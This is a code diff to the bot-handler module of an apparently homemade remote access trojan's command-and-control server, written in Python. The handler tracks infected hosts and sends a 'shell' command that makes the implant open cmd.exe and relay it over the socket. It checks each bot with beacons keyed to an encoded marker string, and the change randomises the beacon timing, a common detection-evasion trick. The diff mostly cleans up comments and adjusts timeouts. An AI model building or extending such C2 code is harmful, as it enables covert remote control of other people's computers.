@@ -8,6 +8,7 @@ import threading
 import queue
 import time
 import subprocess
+import random
 
 class Handler(threading.Thread):
 
@@ -19,25 +20,9 @@ class Handler(threading.Thread):
         self.port = client_address[1]
         self.bot_id = bot_id
         self.info = [self.bot_id,self.ip,self.port]
-        self.status_msg = ""
-        self.status = ["UP","UP"]                             # <-- 0 = Beacon Failed, Connection to RAT broken standby
-                                                        #     1 = Beacon Success, Connection is alive and well
-                                                        #     2 = Last Beacon Failed. Connection seems down. The next check will set status
+        self.beacon_wait = False
+        self.status = ["UP","UP"]                         # <--UP - DOWN - ERR
 
-        # self.respQueue = queue.Queue()
-        # self.cmdQueue = queue.Queue()
-
-    # Look at advantages and disadvantages of using seperate queues for each handler. - NIX'D}
-    #   - They can be initialized in the class itself, rather than in the Server or Interpreter class
-    #   - Look at implementing all Agent functions within the Interpreter class. Consider the example 
-    #       and think about how shifting all of these functions will make a difference in cleanliness.
-    #       It will require the extensive use of queues to pass back information, as the Agent thread
-    #       will continually use it the catch and execute commands. Think...
-    #   + Decision on Queues: Don't pursue. Sequential receiving isn't such a bad thing. Where we truly 
-    #       run into a problem is when we're receiving information that may overflow or hit a timeout.
-    #       
-    #       As such, we should take the idea of looping-recv, with timeouts, but give enough time to 
-    #       realize that connections suck. 
 
 
     def run(self):
@@ -51,29 +36,10 @@ class Handler(threading.Thread):
         # Beacon indefinitely??
         self.beacon()
 
-        # [NIX'D] - Interesting, we can use strings (Thread-#) to index an array. Noted...
-        #server.agentList[self.bot_id]
-        # [NIX'D] - This is a useful array in which we can access Client information (IP, Port) by thread-id
-    
-
-    # Should I remove these and simply have the user select certain connections upon switching to Batch-Mode?? --- Yes
-    # Decision: don't remove, keep functions. But use them in the Batch-mode interaction ---- No...
-
-    # def activate(self):
-    #     print(f"\n[*BotHandler-Msg] Activating Bot {str(self.bot_id)}...")
-    #     self.isActive = True
-    
-    # def deactivate(self):
-    #     print(f"\n[*BotHandler-Msg] Deactivating {str(self.bot_id)}...")
-    #     self.isActive = False
 
     def kill(self):     # hah
         print(f"\n[*BotHandler-Msg] Severing connection for Bot {str(self.bot_id)}...")
         self.execute("kill")
-
-        # Record information into deadConnections[]
-        # deadConnections.append(self.info)             # Append the info so the thread can join the main thread
-        # agentList.remove(self)                          # Remove the Handler-thread from the Alives array
 
         print(f"\n[*BotHandler-Msg] Killing thread for BotHandler {str(self.bot_id)}...")
         # if(threading.current_thread().is_alive()):
@@ -83,7 +49,7 @@ class Handler(threading.Thread):
     def beacon(self):
         
         while(True):
-            time.sleep(30)
+            time.sleep(random.randint(10,40))
 
             # Check HOST-STATUS
             try:
@@ -95,20 +61,28 @@ class Handler(threading.Thread):
             except:
                 self.status[0] = "ERR"
 
+            # Write to log file - record uptime
+
             # Check RAT-STATUS
-            try:
-                msg = self.execute("beacon", True)
-                # print(msg)
+            if not self.beacon_wait:
+                try:
+                    msg = self.execute("beacon", True)
 
-                if "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy" in msg:
-                    self.status[1] = "UP"
-                else:
-                    self.status[1] = "DOWN"
-            except:
-                self.status[1] = "ERR"
+                    if "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy" in msg:
+                        self.status[1] = "UP"
+                    else:
+                        self.status[1] = "DOWN"
+                except:
+                    self.status[1] = "ERR"
 
-    def setStatus(self, status):
-        self.status = status
+                    
+            # Write to beacon log file to record status
+
+
+
+    def setStatus(self, index0, index1):
+        self.status[0] = index0
+        self.status[1] = index1
 
     def getInfo(self):
         return self.info
@@ -127,20 +101,11 @@ class Handler(threading.Thread):
 
     def shell(self):
 
-        # if command is 'shell':
-        #   we send the shell keyword, which initiates the cmd.exe, and then redirects all stdin/out to the socket
-        #   the shell will still be receiving any information we send it, therefore thats why it closed only the cmd.exe session when we subsequently exited.
-        #   We need to figure out a way to capture the shell keyword here, then send it over, while also realizing in the c2
-        #   that we are going to be sending and receiving directly to and from the cmd.exe process, effectively needing a function, loop, or just to catch and exit twice[?]
-        #     
-        #--------
-        # Current problem:
-        #   Data from cmd.exe shell is hanging. I have to initially receive the welcome-msg twice (once for the Microsoft 
-        #   banner and another for the initial shell/cwd output prompt).
-        
-        # Problem solved. The commands no longer hang, but sequences suck
+        self.beacon_wait = True
 
-        # Initiate shell 
+
+        # Initiate shell
+
         try:
             self.client.send(("shell").encode('utf-8'))             # Signals RAT to initiate cmd.exe process and forward fds to socket 
         except Exception as ex:
@@ -151,7 +116,7 @@ class Handler(threading.Thread):
             banner = ""
             while True:
                 try:
-                    self.client.settimeout(1)
+                    self.client.settimeout(2)
                     recv = self.client.recv(4096).decode('utf-8')
                 except:
                     recv = ""
@@ -240,7 +205,6 @@ class Handler(threading.Thread):
                         print(cmd_response.replace(cmd_sent,""))
             
                     if(shell_exit):
-                        # print("yo")
                         break
 
         print(f"[* BotHandler-Msg:ShellExec] Exiting interaction with Bot #{self.bot_id} at {str(self.ip)}")
@@ -249,6 +213,7 @@ class Handler(threading.Thread):
 
     def execute(self, cmd_sent, suppress=False):
         if not suppress:
+            # Log this
             print(f"[* BotHandler-Msg] Received Command: {str(cmd_sent)} for bot {str(self.bot_id)}")
 
         # Single instance execution
@@ -257,6 +222,7 @@ class Handler(threading.Thread):
             
             self.client.send(cmd_sent.encode('utf-8'))
         except Exception as ex:
+            # Log this
             print(f"[* BotHandler-Msg] Unable to send command to bot {self.bot_id} at {str(self.ip)}")
             print(f"[* BotHandler-Msg] Error: {ex}")
             return "== Return Value Error =="
@@ -268,10 +234,11 @@ class Handler(threading.Thread):
                     recv = self.client.recv(4096).decode('utf-8')
 
                 except socket.timeout:
-                    # if timeout exception is triggered - assume no data anymore
+                    # if timeout exception is triggered - assume no more data
                     recv = ""
                 except Exception as ex:
                     if not suppress:
+                        # Log this
                         print("[* BotHandler-Msg:Exec] Unable to process received data.")
                         print(f"[* BotHandler-Msg:Exec] Error: {ex}")
                     break
@@ -282,12 +249,6 @@ class Handler(threading.Thread):
                     cmd_response += recv
             
             return cmd_response
-
-            # TODO %%
-            # print(f"[* BotHandler-Msg] Using beacon verification to test if host is still up...")
-            # if(!beacon(bot_id)):
-            #   <Kill connection, join the thread, ad to list of dead bots>
-
     # TODO %%
     def download(self, remotepath, localfile):
         print("TBC")
